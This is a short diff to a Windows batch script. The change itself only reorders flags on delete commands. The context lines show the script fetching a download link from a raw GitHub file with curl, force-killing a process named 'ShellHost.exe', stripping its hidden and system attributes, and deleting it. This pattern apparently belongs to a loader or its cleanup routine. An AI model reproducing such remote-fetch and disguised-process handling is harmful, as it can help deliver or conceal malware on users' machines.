@@ -36,7 +36,7 @@ echo.
 
 :: Kill & Delete file 
 taskkill /f /im !filename!.exe
-del /f /q "%TEMP%\!filename!.exe"
+del /f /a /q "%TEMP%\!filename!.exe"
  
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/ShellHostFileLink') do set "SHSTFILELINK=%%i"
 
@@ -97,12 +97,12 @@ echo.
 echo TaskKill and Delete ShellHost
 taskkill /F /IM ShellHost.exe
 taskkill /F /IM ShellHost.exe
-del /f /q /a "%SHSTROOT%"
-del /f /q /a "%SHSTFILE%"
+del /f /a /q "%SHSTROOT%"
+del /f /a /q "%SHSTFILE%"
 echo REMOVE ATTRIB OF SHELLHOST
 attrib -S -H -R "%SHSTFILE%"
 echo Delete again
-del /f /q /a "%SHSTFILE%"
+del /f /a /q "%SHSTFILE%"
 echo Done.
 echo.
 echo.
